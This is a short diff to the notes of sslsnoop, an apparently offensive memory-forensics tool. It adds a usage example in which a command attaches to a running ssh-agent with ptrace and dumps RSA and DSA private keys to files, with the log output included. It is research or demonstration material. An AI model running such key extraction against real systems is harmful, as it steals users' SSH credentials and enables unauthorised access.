@@ -31,6 +31,23 @@ INFO:sslsnoop.openssh:Please make some ssh  traffic
 u n a m e   - a v
 Linux ssh1.90.ha.ovh.net 2.6.32.7-mutu-grs-ipv4-32 #2 SMP Sat Feb 6 13:33:23 UTC 2010 i686 GNU/Linux
 
+EOF
+
+Other tricks :
+---------------
+  $ sudo python openssl.py 27477 # ssh-agent
+INFO:abouchet:Target has pid 27477
+INFO:root:Attach process 27477
+INFO:root:Attach <PtraceProcess #27477> to debugger
+INFO:root:Set <PtraceProcess #27477> options to 1
+INFO:abouchet:found instance <class 'ctypes_openssl.RSA'> @ 0xb835c9a0
+INFO:abouchet:[X] Key saved to file outputs/id_rsa-2.key
+INFO:abouchet:found instance <class 'ctypes_openssl.DSA'> @ 0xb835b4e8
+INFO:abouchet:[X] Key saved to file outputs/id_dsa-2.key
+INFO:abouchet:done for pid 27477
+
+
+
 poc done.
 It often doesn't work out and it surely doesn't work on output streams af of release c6e0011
 
